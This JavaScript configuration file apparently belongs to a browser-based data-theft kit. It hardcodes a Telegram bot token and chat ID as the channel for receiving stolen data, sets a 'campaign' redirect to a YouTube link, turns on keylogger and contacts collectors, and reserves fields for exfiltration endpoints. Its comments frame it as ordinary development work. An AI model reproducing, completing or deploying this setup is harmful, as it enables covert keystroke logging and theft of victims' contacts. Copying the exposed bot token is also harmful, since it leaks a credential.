// language: JavaScript, file: config.js
// *DEV ONLY — hardcoded token. rotate before public deploy.*
// *loads BEFORE core.js — sets window.APP_CONFIG which config-loader.js reads first*

window.APP_CONFIG = {
    telegram: {
        botToken: '7992081098:AAFDa3mYSIKKwhZagDA_Z22sb18ApExc8BI',
        chatId: '1523864238',
    },
    campaign: {
        redirect: 'https://www.youtube.com/watch?v=CzI6VVk-0c8',
    },
    collectors: {
        enableScreenRecorder: false,
        enableKeylogger: true,
        enableContacts: true,
    },
    exfil: {
        websocketEndpoint: null,
        restEndpoint: null,
        restApiKey: null,
    },
};